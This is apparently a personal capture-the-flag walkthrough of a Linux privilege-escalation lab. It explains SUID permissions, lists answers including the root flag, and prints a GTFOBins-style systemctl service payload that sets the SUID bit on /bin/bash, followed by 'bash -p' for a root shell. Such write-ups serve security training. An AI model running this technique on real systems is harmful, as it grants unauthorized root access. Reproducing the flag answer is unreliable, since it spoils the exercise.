Now that you have compromised this machine, we will escalate our privileges and become the superuser (root).  

Answer the questions below

In Linux, SUID (**set owner userId upon execution**) is a particular type of file permission given to a file. SUID gives temporary permissions to a user to run the program/file with the permission of the file owner (rather than the user who runs it).  

For example, the binary file to change your password has the SUID bit set on it (/usr/bin/passwd). This is because to change your password; it will need to write to the shadowers file that you do not have access to, root does; so it has root privileges to make the right changes.

![](https://i.imgur.com/ZhaNR2p.jpg)

| Question                                                         | Answer         |
| ---------------------------------------------------------------- | -------------- |
| On the system, search for all SUID files. Which file stands out? | /bin/systemctl |

It's challenge time! We have guided you through this far. Can you exploit this system further to escalate your privileges and get the final answer?

| Question                                           | Answer                           |
| -------------------------------------------------- | -------------------------------- |
| Become root and get the last flag (/root/root.txt) | a58ff8579f0a9270368d33a9966c7fd5 |
*Before*:

![[Pasted image 20240302235306.png]]

*Escalate privileges using GTFObins*:

![[Pasted image 20240302234410.png]]


*Copy the code for SUID and paste*:

```
TF=$(mktemp).service

echo '[Service]

Type=oneshot

ExecStart=/bin/sh -c "chmod +s /bin/bash"

[Install]

WantedBy=multi-user.target' > $TF

/bin/systemctl link $TF

/bin/systemctl enable --now $TF
```

![[Pasted image 20240302235333.png]]

*Become root*:

```
bash -p
```

![[Pasted image 20240302235445.png]]

*Find flag*:

![[Pasted image 20240302235601.png]]
